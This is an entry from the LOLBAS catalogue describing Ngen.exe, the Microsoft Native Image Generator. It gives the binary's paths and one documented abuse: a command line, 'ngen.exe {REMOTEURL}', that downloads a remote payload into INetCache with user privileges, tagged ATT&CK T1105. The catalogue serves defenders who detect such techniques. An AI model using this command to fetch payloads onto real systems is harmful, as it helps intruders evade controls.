---
title: "Ngen.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Ngen/
fetched_at: 2026-09-20T17:10:51Z
license: unspecified
category: windows
---

Microsoft Native Image Generator.

## Paths
- C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe
- C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe

## Acknowledgements
- Avihay Eldad ([@AvihayEldad](https://twitter.com/@AvihayEldad))

## Download

1. Downloads payload from remote server using the Microsoft Native Image Generator utility.

```
ngen.exe {REMOTEURL}
```

   - Use case: It will download a remote payload and place it in INetCache.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
